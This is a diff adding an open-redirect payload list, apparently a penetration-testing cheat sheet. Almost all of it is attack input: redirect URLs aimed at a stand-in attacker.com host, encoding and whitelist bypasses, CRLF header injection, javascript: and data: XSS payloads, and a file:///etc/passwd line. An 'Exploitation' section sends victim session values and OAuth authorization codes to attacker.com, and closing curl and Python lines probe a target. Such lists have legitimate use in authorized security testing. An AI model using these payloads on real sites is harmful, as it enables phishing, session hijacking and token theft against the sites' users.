@@ -1,0 +1,281 @@
+# Open Redirect Payloads
+
+## ========================================
+## BASIC REDIRECTS
+## ========================================
+
+# Simple redirects
+http://attacker.com
+https://attacker.com
+//attacker.com
+///attacker.com
+////attacker.com
+
+## ========================================
+## PROTOCOL-BASED
+## ========================================
+
+# HTTP/HTTPS
+http://attacker.com
+https://attacker.com
+hTTp://attacker.com
+htTp://attacker.com
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript://attacker.com%0Aalert(1)
+
+# Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+## ========================================
+## DOMAIN TRICKS
+## ========================================
+
+# Subdomain confusion
+http://attacker.com.target.com
+http://target.com.attacker.com
+
+# @ symbol trick
+http://target.com@attacker.com
+http://target.com:80@attacker.com
+http://target.com%00@attacker.com
+
+# Backslash trick
+http://target.com\attacker.com
+http://target.com\.attacker.com
+
+# Question mark
+http://target.com?attacker.com
+http://target.com?@attacker.com
+
+# Hash
+http://target.com#attacker.com
+http://target.com#@attacker.com
+
+## ========================================
+## ENCODING BYPASS
+## ========================================
+
+# URL encoding
+http%3A%2F%2Fattacker.com
+https%3A%2F%2Fattacker.com
+
+# Double encoding
+http%253A%252F%252Fattacker.com
+
+# Unicode encoding
+http://attacker%E3%80%82com
+http://attacker%u2215com
+
+# Hex encoding
+http://0x7f.0x0.0x0.0x1
+
+# Octal encoding
+http://0177.0.0.1
+
+# Decimal encoding
+http://2130706433
+
+## ========================================
+## IP ADDRESS VARIATIONS
+## ========================================
+
+# Decimal IP
+http://2130706433
+http://3232235777
+
+# Hex IP
+http://0x7f.0x0.0x1
+http://0x7f000001
+
+# Octal IP
+http://0177.0.0.1
+http://017700000001
+
+# Mixed encoding
+http://0x7f.0.1
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Null byte
+http://target.com%00.attacker.com
+http://attacker.com%00@target.com
+
+# CRLF injection
+http://target.com%0D%0ALocation:%20http://attacker.com
+
+# Dot segment
+http://target.com/../../../attacker.com
+http://target.com/./attacker.com
+
+# Whitespace
+http://target.com%20@attacker.com
+http://target.com%09@attacker.com
+http://target.com%0a@attacker.com
+
+## ========================================
+## WHITELISTING BYPASS
+## ========================================
+
+# If target.com is whitelisted
+http://target.com.attacker.com
+http://attacker.com/target.com
+http://attacker.com?target.com
+http://attacker.com#target.com
+http://attacker.com@target.com
+
+# Path confusion
+/redirect?url=//attacker.com
+/redirect?url=///attacker.com
+/redirect?url=////attacker.com
+
+## ========================================
+## PARAMETER POLLUTION
+## ========================================
+
+?url=http://target.com&url=http://attacker.com
+?url=http://target.com?url=http://attacker.com
+?next=/login&next=http://attacker.com
+
+## ========================================
+## PROTOCOL SMUGGLING
+## ========================================
+
+# Using different protocols
+ftp://attacker.com
+file:///etc/passwd
+gopher://attacker.com
+dict://attacker.com
+
+## ========================================
+## IDN HOMOGRAPH ATTACK
+## ========================================
+
+# Look-alike domains
+http://аmazon.com  (Cyrillic 'а')
+http://gооgle.com  (Cyrillic 'о')
+http://facеbook.com (Cyrillic 'е')
+
+## ========================================
+## XSS VIA OPEN REDIRECT
+## ========================================
+
+javascript:alert(1)
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+
+## ========================================
+## COMMON PARAMETERS
+## ========================================
+
+?url=
+?redirect=
+?next=
+?return=
+?returnTo=
+?rurl=
+?redirect_uri=
+?continue=
+?dest=
+?destination=
+?redir=
+?redirect_url=
+?checkout_url=
+?goto=
+?link=
+?target=
+?view=
+?out=
+?to=
+
+## ========================================
+## REAL-WORLD EXAMPLES
+## ========================================
+
+# OAuth redirect_uri
+/oauth/authorize?redirect_uri=http://attacker.com
+
+# Login/Logout redirects
+/login?next=http://attacker.com
+/logout?return=//attacker.com
+
+# URL shortener
+/s?url=http://attacker.com
+
+# Checkout flow
+/checkout?continue=http://attacker.com
+
+## ========================================
+## ADVANCED BYPASS
+## ========================================
+
+# Using different TLDs
+http://target.com.evil.com
+http://target.com.attacker.tk
+
+# Using subdomains
+http://attacker-target.com
+http://target-attacker.com
+
+# Path-based
+http://target.com/redirect/http://attacker.com
+http://target.com/.well-known/http://attacker.com
+
+## ========================================
+## FRAGMENT IDENTIFIER
+## ========================================
+
+#http://attacker.com
+#//attacker.com
+#javascript:alert(1)
+
+## ========================================
+## SPECIAL CASES
+## ========================================
+
+# Windows path
+\\attacker.com
+\\attacker.com\share
+
+# File protocol
+file://attacker.com
+file:///attacker.com
+
+# Localhost variations
+http://127.0.0.1
+http://localhost
+http://[::1]
+http://0.0.0.0
+
+## ========================================
+## EXPLOITATION
+## ========================================
+
+# Phishing
+http://attacker.com/fake-login-page
+
+# Session stealing
+http://attacker.com/?session=VICTIM_SESSION
+
+# OAuth token theft
+http://attacker.com/?code=AUTHORIZATION_CODE
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite Intruder
+# Load payloads and test redirect parameters
+
+# curl
+curl -I "http://target.com/redirect?url=http://attacker.com"
+
+# Python
+import requests
+r = requests.get('http://target.com/redirect?url=http://attacker.com', allow_redirects=False)
+print(r.headers['Location'])
